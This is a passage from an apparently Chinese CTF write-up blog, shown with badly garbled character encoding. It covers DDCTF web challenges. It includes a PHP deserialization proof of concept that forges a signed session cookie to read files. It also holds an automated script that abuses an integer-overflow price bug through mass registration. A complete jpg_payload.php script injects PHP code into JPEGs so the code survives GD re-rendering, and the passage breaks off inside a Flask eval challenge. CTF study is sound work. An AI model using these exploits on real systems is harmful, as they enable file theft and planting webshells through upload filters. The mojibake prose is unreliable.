            $this-&gt;response(&apos;æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php&apos;);
            return TRUE;
        }else{
            $this-&gt;response(&apos;æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----&apos;,&apos;error&apos;);
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);
    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);
    return $path;
}

public function __destruct() {
    if(empty($this-&gt;path)) {
        exit();
    }else{
        $path = $this-&gt;sanitizepath($this-&gt;path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);
    }
    exit();
}
}




url:app/Session.php



include &apos;Application.php&apos;;
class Session extends Application {

    //keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸²
    var $eancrykey                  = &apos;&apos;;
    var $cookie_expiration            = 7200;
    var $cookie_name                = &apos;ddctf_id&apos;;
    var $cookie_path                = &apos;&apos;;
    var $cookie_domain                = &apos;&apos;;
    var $cookie_secure                = FALSE;
    var $activity                   = &quot;DiDiCTF&quot;;


    public function index()
    {
    if(parent::auth()) {
            $this-&gt;get_key();
            if($this-&gt;session_read()) {
                $data = &apos;DiDI Welcome you %s&apos;;
                $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);
                parent::response($data,&apos;sucess&apos;);
            }else{
                $this-&gt;session_create();
                $data = &apos;DiDI Welcome you&apos;;
                parent::response($data,&apos;sucess&apos;);
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this-&gt;eancrykey =  file_get_contents(&apos;../config/key.txt&apos;);
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this-&gt;cookie_name];
        if(!isset($session)) {
            parent::response(&quot;session not found&quot;,&apos;error&apos;);
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this-&gt;eancrykey.$session)) {
            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;])){
            return FALSE;
        }

        if(!empty($_POST[&quot;nickname&quot;])) {
            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
            $data = &quot;Welcome my friend %s&quot;;
            foreach ($arr as $k =&gt; $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,&quot;Welcome&quot;);
        }

        if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) {
            parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;);
            return FALSE;
        }
        if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) {
            parent::response(&apos;the user agent not match&apos;,&apos;error&apos;);
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = &apos;&apos;;
        while(strlen($sessionid) &lt; 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)),
            &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;],
            &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;],
            &apos;user_data&apos; =&gt; &apos;&apos;,
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);
        $expire = $this-&gt;cookie_expiration + time();
        setcookie(
            $this-&gt;cookie_name,
            $cookiedata,
            $expire,
            $this-&gt;cookie_path,
            $this-&gt;cookie_domain,
            $this-&gt;cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf-&gt;index();</code></pre>
                                    <p>é€šè¯»phpæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°è·å¾—flagçš„å…³é”®ä»£ç åœ¨Application.phpè¯»å–æ–‡ä»¶è¿™ä¸€è¡Œï¼Œ</p>
                                    <pre><code>public function __destruct()
{
    if(empty($this-&gt;path)) {
        exit();
    }else{
        $path = $this-&gt;sanitizepath($this-&gt;path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);
    }
    exit();
}
}</code></pre>
                                    <p>
                                        å¯è§ï¼Œåªè¦æ§åˆ¶äº†pathå°±å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶ï¼Œå…¥æ‰‹ç‚¹åœ¨session.phpæ–‡ä»¶ä¸­ï¼ŒåŒ…å«äº†Application.phpï¼Œæ‰€ä»¥ä»session.phpå…¥æ‰‹ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€è¡Œ </p>
                                    <pre><code>$session = unserialize($session);</code></pre>
                                    <p>
                                        ä¼šå°†æˆ‘ä»¬çš„sessionååºåˆ—åŒ–ï¼Œå¦‚æœåœ¨sessionä¸­åŠ å…¥pathå˜é‡ï¼Œååºåˆ—åŒ–è°ƒç”¨classç±»ï¼Œç„¶ååˆ©ç”¨ææ„å‡½æ•°æ¥æ‰§è¡Œè¯»å–æ–‡ä»¶çš„æ“ä½œã€‚</p>
                                    <p>æŸ¥çœ‹session.phpï¼Œåªè¦function
                                        session_read()è¿”å›falseï¼Œä»£ç æ®µï¼Œå¦‚æœsession_read()è¿”å›false</p>
                                    <pre><code>if(parent::auth()) {
        $this-&gt;get_key();
        if($this-&gt;session_read()) {
            $data = &apos;DiDI Welcome you %s&apos;;
            $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);
            parent::response($data,&apos;sucess&apos;);
        }
        else{
            $this-&gt;session_create();
            $data = &apos;DiDI Welcome you&apos;;
            parent::response($data,&apos;sucess&apos;);
        }
    }</code></pre>
                                    <p>å°±ä¼šæ‰§è¡Œelseä¸­çš„session_createï¼Œæˆ‘ä»¬æ„é€ çš„cookieä¸­çš„sessionå°±ä¼šè¢«è¦†ç›–ï¼Œ</p>
                                    <pre><code>if(!isset($session)) {
            parent::response(&quot;session not found&quot;,&apos;error&apos;);
            return FALSE;
        }

        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this-&gt;eancrykey.$session)) {
            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);
            return FALSE;
        }</code></pre>
                                    <p>éœ€è¦hashç­‰äºmd5($this-&gt;eancrykey.$session)ï¼Œè‡ªå·±æ„é€ çš„è¯ï¼Œé¦–å…ˆéœ€è¦å¾—åˆ°eancrykeyï¼Œå¾—åˆ°eancryketçš„ä»£ç æ®µã€‚</p>
                                    <pre><code>if(!empty($_POST[&quot;nickname&quot;])) {
           $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);
           $data = &quot;Welcome my friend %s&quot;;
           foreach ($arr as $k =&gt; $v) {
               $data = sprintf($data,$v);
           }
           parent::response($data,&quot;Welcome&quot;); #eancrykey-&gt;EzblrbNS
       }</code></pre>
                                    <p>æˆ‘ä»¬ä¼ å…¥postå‚æ•°ï¼Œç„¶åforeachï¼Œ$Væ›¿æ¢æ‰%s,ä¹Ÿå°±æ˜¯å¦‚æœè¾“å…¥nickname=1ï¼Œè¾“å‡ºWelcome my
                                        friend 1ï¼Œä½†æ˜¯è¿™æ ·æ— æ³•è¯»å–åˆ°eancrykeyï¼Œç¬¬äºŒæ¬¡foreachï¼Œ$dataå°±å˜æˆWelcome my
                                        friend
                                        1ï¼Œæ— æ³•è·å¾—eancrykeyï¼Œä½†æ˜¯å¦‚æœç¬¬ä¸€æ¬¡ä¼ å…¥nickname=%sã€‚ç¬¬äºŒæ¬¡foreachçš„dataä¾ç„¶æ˜¯Welcome
                                        my friend
                                        %sï¼Œè·å¾—eancrykeyã€‚æ­¤æ—¶éœ€è¦ä½¿ç”¨æœåŠ¡å™¨é¥­å›æ¥çš„sessionï¼Œä¸ç„¶ç¬¬ä¸€ä¸ªä»£ç æ®µè¿”å›falseï¼Œæ— æ³•æ‰§è¡Œä¸‹é¢çš„ä»£ç ã€‚</p>
                                    <pre><code>if(empty($_COOKIE)) {
    return FALSE;
    }</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1555241769.jpg" alt>
                                    </p>
                                    <p>è·å¾—eancrykeyä¹‹åå°±å¯ä»¥ç»•è¿‡$hash !== md5($this-&gt;eancrykey.$session),ä»è€Œæ‰§è¡Œ
                                        $session = unserialize($session);</p>
                                    <p>hashæ˜¯æˆ‘ä»¬ä¼ å…¥çš„cookieçš„æœ€å32ä½ï¼Œmd5($this-&gt;eancrykey.$session)æ˜¯eancrykeyåŠ æˆ‘ä»¬ä¼ å…¥çš„å»é™¤æ‰æœ€å32ä½cookieï¼Œç„¶ååœ¨md5ï¼Œè¿™äº›éƒ½å¯æ§ï¼Œæ„é€ ä½¿ä»–ä»¬ç›¸ç­‰ï¼Œæœ€åæ„é€ pocï¼Œå…¶ä¸­ä»£ç æœ‰ä¸€å¥æ³¨é‡Šå‘Šè¯‰æˆ‘ä»¬flagåœ¨å“ªé‡Œã€‚</p>
                                    <pre><code>private function get_key() {
      //eancrykey  and flag under the folder
      $this-&gt;eancrykey =  file_get_contents(&apos;../config/key.txt&apos;);
  }</code></pre>
                                    <p>
                                        ä¹Ÿå°±æ˜¯flagåœ¨../config/ç›®å½•ä¸‹ï¼Œå…¶ä¸­../è¿›è¡Œäº†è¿‡æ»¤ï¼Œ../æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡å³å¯ï¼Œâ€¦.//ï¼Œå°†../æ›¿æ¢ä¸ºç©ºæ­£å¥½æ˜¯../</p>
                                    <p>æ„é€ poc:</p>
                                    <pre><code>O:11:&quot;Application&quot;:1:{s:4:&quot;path&quot;;s:21:&quot;....//config/flag.txt&quot;;}77cd55a8d29df4f005f85e536d876525#éœ€è¦urlç¼–ç ã€‚</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1555242779.jpg" alt>
                                    </p>
                                    <h1 id="å¤§å‰å¤§åˆ©-ä»Šæ™šåƒé¸¡"><a href="#å¤§å‰å¤§åˆ©-ä»Šæ™šåƒé¸¡" class="headerlink"
                                                          title="å¤§å‰å¤§åˆ©,ä»Šæ™šåƒé¸¡~"></a>å¤§å‰å¤§åˆ©,ä»Šæ™šåƒé¸¡~</h1>
                                    <p>è¿™é“é¢˜ç›®è€ƒçš„ç›¸å¯¹ç®€å•ï¼Œåªæœ‰ä¸€ä¸ªç‚¹ï¼Œæ•´æ•°æº¢å‡ºã€‚</p>
                                    <p>
                                        åˆ©ç”¨32ä½çš„ä½é™åˆ¶ï¼Œ2çš„32ä½ä¸º4294967295ï¼Œåªè¦è¶…å‡ºå°±ä¼šå˜ä¸º33ä½ä»è€Œæº¢å‡ºï¼Œä½†æ˜¯æœ€å¤§32ä½ï¼Œæœ€ç»ˆé€ æˆæº¢å‡ºï¼Œå¯ä»¥å‘ç°ï¼Œè´­ä¹°çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥æŠ“åŒ…ä¿®æ”¹ä»·æ ¼ï¼Œå¯ä»¥å¾€é«˜ä¿®æ”¹ï¼Œä½†æ˜¯æ— æ³•ä¿®æ”¹ä½ä»·æ ¼ã€‚è®¾ç½®ä»·æ ¼ä¸º4294967296ï¼Œæ­£å¥½å¤šå‡ºä¸€ä½ï¼Œæº¢å‡ºã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555304033.jpg"
                                            alt><br><img
                                            src="http://47.106.185.69/1/./img/1555304091.jpg" alt>
                                    </p>
                                    <p>æ­¤æ—¶ä»·æ ¼å·²ç»å‘ç”Ÿæ”¹å˜ï¼Œè™½ç„¶æ•°å€¼å˜å¤§äº†ï¼Œä½†æ˜¯ç›´æ¥æ”¯ä»˜æ˜¯å¯ä»¥æ”¯ä»˜æˆåŠŸçš„ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555304139.jpg" alt>
                                    </p>
                                    <p>æ­¤æ—¶å°±æ­£å¸¸ç§»é™¤å¯¹æ‰‹å°±å¯ä»¥ï¼Œç§»é™¤100ä¸ªå¯¹æ‰‹å¾—åˆ°flagï¼Œå†™ä¸ªè„šæœ¬ï¼Œæ³¨å†Œè·å¾—id ticketï¼Œä¸æ–­ç§»é™¤å¯¹æ‰‹å³å¯ã€‚</p>
                                    <p>
                                        ä½†æ˜¯ä¸€å¼€å§‹ç§»é™¤æ²¡æœ‰é—®é¢˜ï¼Œåé¢å‘ç°ï¼ŒåŒIDå¥½åƒåªèƒ½ç§»é™¤ä¸€æ¬¡ï¼Œæ‰€ä»¥åæœŸå¿…é¡»ä¸æ–­å¤§é‡æ³¨å†Œï¼Œå¿…é¡»å†™è„šæœ¬ã€‚è€Œç”Ÿæˆçš„IDåæœŸä¼šä¸€ç›´é‡å¤ï¼Œå¿…é¡»å¤§é‡æ³¨å†Œæ‹¼å‡‘åˆ°100ä¸ªä¸åŒçš„IDã€‚</p>
                                    <p>æ¥ä¸‹æ¥æ˜¯è„šæœ¬ã€‚è·‘äº†å¥½ä¸€ä¼šå¿«ä¸€ä¸ªå°æ—¶ã€‚ã€‚ - -ã€‚ç½‘ç»œä¸ä½³ã€‚</p>
                                    <pre><code>import requests
import time
requests.packages.urllib3.disable_warnings()
import re

urlsss=&quot;http://117.51.147.155:5050/ctf/api/login?name=saddsadsa545&amp;password=saddsadsa545&quot;#è¿™é‡Œå†™éœ€è¦åƒé¸¡çš„è´¦å·æœ€ç»ˆæ¥å—flagçš„è´¦å·
ss=requests.Session()
rr=ss.get(urlsss)

for i in range(3500,10000):

    try:
        s=requests.Session()
        register=&quot;http://117.51.147.155:5050//ctf/api/register?name=zhupeiqia%s&amp;password=zhupeiqia%s&quot;
        url=register%(str(i),str(i))
        res=s.get(url)
        print res.text
        url=&quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967297&quot;
        #login=&quot;http://117.51.147.155:5050/ctf/api/login?name=zhupeiqia%s&amp;password=zhupeiqia%s&quot;
        #logins=login%(str(i),str(i))
        #s=requests.Session()
        #r=s.get(logins,timeout=3)
        r=s.get(url)
        id=&quot;http://117.51.147.155:5050/ctf/api/search_bill_info&quot;
        r=s.get(id)
        a=r.text[32:68]
        pay=&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=%s&quot;
        pays=pay%(str(a))
        r=s.get(pays)
        id=r.text[30:34]
        tick=r.text[48:83]
        id=id.replace(&quot;:&quot;, &quot;&quot;)
        id=id.replace(&quot;,&quot;, &quot;&quot;)
        id=id.replace(&apos;&quot;&apos;, &quot;&quot;)
        tick=tick.replace(&apos;&quot;&apos;,&quot;&quot;)
        tick=tick.replace(&apos;}&apos;,&quot;&quot;)
        tick=tick.replace(&apos;]&apos;,&quot;&quot;)
        tick=tick.replace(&apos;:&apos;,&quot;&quot;)
        print id
         print tick
        yichu=&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=%s&amp;ticket=%s&quot;
        result=yichu%(str(id),str(tick))
        rr=ss.get(result)
        print rr.text

    except Exception as e:
           pass
    time.sleep(1)</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1555310195.jpg" alt>
                                    </p>
                                    <h1 id="Uoload-IMG"><a href="#Uoload-IMG" class="headerlink"
                                                           title="Uoload-IMG"></a>Uoload-IMG</h1>
                                    <p>è¿™é“é¢˜è€ƒç‚¹åœ¨å›¾ç‰‡ä¸Šä¼ çš„äºŒæ¬¡æ¸²æŸ“ï¼Œå‚è€ƒå…ˆçŸ¥çš„ä¸€ç¯‡æ–‡ç« ï¼Œå¾ˆå®ç”¨</p>
                                    <pre><code>https://xz.aliyun.com/t/2657</code></pre>
                                    <p>
                                        åœ¨ä¸Šä¼ å›¾ç‰‡é©¬çš„æ—¶å€™æœ‰ç§æ£€æŸ¥æ–¹å¼æ˜¯å›¾ç‰‡æ¸²æŸ“ï¼Œå¯¹äºå›¾ç‰‡ä¸€æ¬¡æ¸²æŸ“å¾ˆå®¹æ˜“ç»•è¿‡ï¼Œåªè¦ä¸ç ´åå›¾ç‰‡ç»“æ„å³å¯ï¼Œå³æ’å…¥äº†ä¸€å¥è¯æ‰“å¼€å›¾ç‰‡ï¼Œå›¾åƒå¹¶ä¸å—ä»»ä½•å½±å“ï¼Œä¸€èˆ¬åœ¨16è¿›åˆ¶ä¸‹åœ¨æœ€ååŠ ä¸Šä¸€å¥è¯æˆ–è€…åœ¨å›¾ç‰‡16è¿›åˆ¶ä¸­é—´ç©ºç™½å¤„åŠ ä¸Šå³å¯ã€‚</p>
                                    <p>æœ¬é¢˜ç”¨åˆ°äº†äºŒæ¬¡æ¸²æŸ“çŸ¥è¯†ï¼Œå³ï¼Œä¸Šä¼ å›¾ç‰‡ä¹‹åï¼ŒæœåŠ¡å™¨è¦å¯¹å›¾ç‰‡åšç¬¬äºŒæ¬¡æ¸²æŸ“ï¼Œå°†ç¬¦åˆå›¾åƒçš„å†…å®¹ç•™ä¸‹æ¥ã€‚ä¸¾ä¸ªä¾‹å­ã€‚</p>
                                    <p>16è¿›åˆ¶åŠ å…¥phpinfo()ä»£ç ç„¶åè¿›è¡Œä¸Šä¼ ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555328687.jpg" alt>
                                    </p>
                                    <p><img src="http://47.106.185.69/1/./img/1555328840.jpg" alt>
                                    </p>
                                    <p>æ­¤æ—¶æœåŠ¡å™¨å·²ç»ä¸Šä¼ ä¸Šå»æˆ‘ä»¬çš„å›¾ç‰‡ï¼Œä¸‹è½½ä¸‹æ¥ç½‘ç«™ä¸Šå·²ç»ä¸Šä¼ æˆåŠŸçš„å›¾ç‰‡ï¼Œ</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555328986.jpg" alt>
                                    </p>
                                    <p>
                                        å‘ç°æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡ä¸­çš„phpinfoä¸è§äº†ï¼Œè€Œä¸”å›¾ç‰‡ä¸­æœ‰ä¸ªç‰¹å¾ï¼Œgdåº“æ¸²æŸ“ï¼Œè¯´æ˜æ˜¯ä½¿ç”¨äº†äºŒæ¬¡æ¸²æŸ“ï¼Œæ­¤æ—¶å°±æ˜ç™½äº†è€ƒç‚¹ï¼Œä½¿ç”¨äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‚</p>
                                    <p>å…ˆçŸ¥ç¤¾åŒºçš„æ–‡ç« è¯´æ˜çš„å¾ˆæ¸…æ¥šåŒ…æ‹¬jpg,gif,pngï¼Œè¿™é‡Œä½¿ç”¨jpgæ¥ç»•è¿‡ä¸Šä¼ ã€‚</p>
                                    <p>æ–‡ä»¶jpg_payload.php</p>
                                    <pre><code>&lt;?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs &quot;Something&apos;s wrong&quot;.
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;


    if(!extension_loaded(&apos;gd&apos;) || !function_exists(&apos;imagecreatefromjpeg&apos;)) {
        die(&apos;php-gd is not installed&apos;);
    }

    if(!isset($argv[1])) {
        die(&apos;php jpg_payload.php &lt;jpg_name.jpg&gt;&apos;);
    }

    set_error_handler(&quot;custom_error_handler&quot;);

    for($pad = 0; $pad &lt; 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis-&gt;readShort() != 0xFFD8) {
            die(&apos;Incorrect SOI marker&apos;);
        }

        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - 2;
            $dis-&gt;skip($size);
            if($marker === 0xDA) {
                $startPos = $dis-&gt;seek();
                $outStreamTmp =
                    substr($outStream, 0, $startPos) .
                    $miniPayload .
                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) .
                    substr($outStream, $startPos);
                checkImage(&apos;_&apos;.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis-&gt;eof())) {
                        if($dis-&gt;readByte() === 0xFF) {
                            if($dis-&gt;readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis-&gt;seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream =
                        substr($outStream, 0, $startPos) .
                        $miniPayload .
                        substr(
                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) .
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage(&apos;payload_&apos;.$argv[1], $outStream)) {
                    die(&apos;Success!&apos;);
                } else {
                    break;
                }
            }
        }
    }
    unlink(&apos;payload_&apos;.$argv[1]);
    die(&apos;Something\&apos;s wrong&apos;);

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match(&apos;/(\d+) extraneous bytes before marker/&apos;, $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this-&gt;binData = &apos;&apos;;
            $this-&gt;order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die(&apos;File not exists [&apos;.$filename.&apos;]&apos;);
                $this-&gt;binData = file_get_contents($filename);
            } else {
                $this-&gt;binData = $filename;
            }
            $this-&gt;size = strlen($this-&gt;binData);
        }

        public function seek() {
            return ($this-&gt;size - strlen($this-&gt;binData));
        }

        public function skip($skip) {
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        }

        public function readByte() {
            if($this-&gt;eof()) {
                die(&apos;End Of File&apos;);
            }
            $byte = substr($this-&gt;binData, 0, 1);
            $this-&gt;binData = substr($this-&gt;binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this-&gt;binData) &lt; 2) {
                die(&apos;End Of File&apos;);
            }
            $short = substr($this-&gt;binData, 0, 2);
            $this-&gt;binData = substr($this-&gt;binData, 2);
            if($this-&gt;order) {
                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
        }
    }
?&gt;</code></pre>
                                    <p>1.é¦–å…ˆä¸Šä¼ 1.jpgåˆ°ctfå¹³å°ä¸Šï¼Œç„¶åä¸‹è½½ç»è¿‡ç½‘ç«™äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡,ä¿å­˜ä¸º1.jpg</p>
                                    <p>2.æ‰§è¡Œå‘½ä»¤ php jpg_payload.php 1.jpg</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555329350.jpg" alt>
                                    </p>
                                    <p>
                                        3.å°†ç”Ÿæˆçš„payload_1.jpgä¸Šä¼ å³å¯ã€‚ä¹Ÿå¯ä»¥æŸ¥çœ‹ç½‘ç«™äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡å¯ä»¥å‘ç°ï¼Œphpinfo()å¹¶æ²¡æœ‰å› äºŒæ¬¡æ¸²æŸ“è€Œå»é™¤ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555329488.jpg" alt>
                                    </p>
                                    <h1 id="homebrew-event-loop"><a href="#homebrew-event-loop"
                                                                    class="headerlink"
                                                                    title="homebrew event loop"></a>homebrew
                                        event loop</h1>
                                    <p>ä¸€é“flask pythoné¢˜ç›®ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯flask sessionä¼ªé€ ã€‚ç„¶è€Œå¹¶ä¸æ˜¯-0-ï¼</p>
                                    <p>ç‚¹å¼€é¢˜ç›®ï¼Œå…ˆæ™ºèƒ½ç¿»è¯‘ä»¥ä¸‹è‹±æ–‡ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555571018.jpg" alt>
                                    </p>
                                    <p>è¿™é“é¢˜ç›®æ˜¯python flaskçš„ä¸€é“ä»£ç å®¡è®¡ã€‚ç»™äº†æºä»£ç ,ä¸æ˜¯å¾ˆç†Ÿæ‚‰ä»£ç çš„æœ€å¥½åœ¨æœ¬åœ°å¤ç°ç¯å¢ƒï¼Œæ¯”è¾ƒå®¹æ˜“ç†è§£ã€‚</p>
                                    <pre><code># -*- encoding: utf-8 -*-
# written in python 2.7
__author__ = &apos;garzon&apos;

from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = &apos;*********************&apos; # censored
url_prefix = &apos;/d5af33f66147e857&apos;

def FLAG():
    return &apos;FLAG_is_here_but_i_wont_show_you&apos;  # censored

def trigger_event(event):
    session[&apos;log&apos;].append(event)
    if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]
    if type(event) == type([]):
        request.event_queue += event
    else:
        request.event_queue.append(event)

def get_mid_str(haystack, prefix, postfix=None):
    haystack = haystack[haystack.find(prefix)+len(prefix):]
    if postfix is not None:
        haystack = haystack[:haystack.find(postfix)]
    return haystack

class RollBackException: pass

def execute_event_loop():
    valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;)
    resp = None
    while len(request.event_queue) &gt; 0:
        event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;
        request.event_queue = request.event_queue[1:]
        if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue
        for c in event:
            if c not in valid_event_chars: break
        else:
            is_action = event[0] == &apos;a&apos;
            action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;)
            args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;)
            try:
                event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))
                ret_val = event_handler(args)
            except RollBackException:
                if resp is None: resp = &apos;&apos;
                resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos;
                resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;
                session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;]
                session[&apos;points&apos;] = request.prev_session[&apos;points&apos;]
                break
            except Exception, e:
                if resp is None: resp = &apos;&apos;
                #resp += str(e) # only for debugging
                continue
            if ret_val is not None:
                if resp is None: resp = ret_val
                else: resp += ret_val
    if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404)
    session.modified = True
    return resp

@app.route(url_prefix+&apos;/&apos;)
def entry_point():
    querystring = urllib.unquote(request.query_string)
    request.event_queue = []
    if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100:
        querystring = &apos;action:index;False#False&apos;
    if &apos;num_items&apos; not in session:
        session[&apos;num_items&apos;] = 0
        session[&apos;points&apos;] = 3
        session[&apos;log&apos;] = []
    request.prev_session = dict(session)
    trigger_event(querystring)
    return execute_event_loop()

# handlers/functions below --------------------------------------

def view_handler(args):
    page = args[0]
    html = &apos;&apos;
    html += &apos;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;])
    if page == &apos;index&apos;:
        html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos;
        html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos;
        html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos;
    elif page == &apos;shop&apos;:
        html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos;
    elif page == &apos;reset&apos;:
        del session[&apos;num_items&apos;]
        html += &apos;Session reset.&lt;br /&gt;&apos;
    html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;
    return html

def index_handler(args):
    bool_show_source = str(args[0])
    bool_download_source = str(args[1])
    if bool_show_source == &apos;True&apos;:

        source = open(&apos;eventLoop.py&apos;, &apos;r&apos;)
        html = &apos;&apos;
        if bool_download_source != &apos;True&apos;:
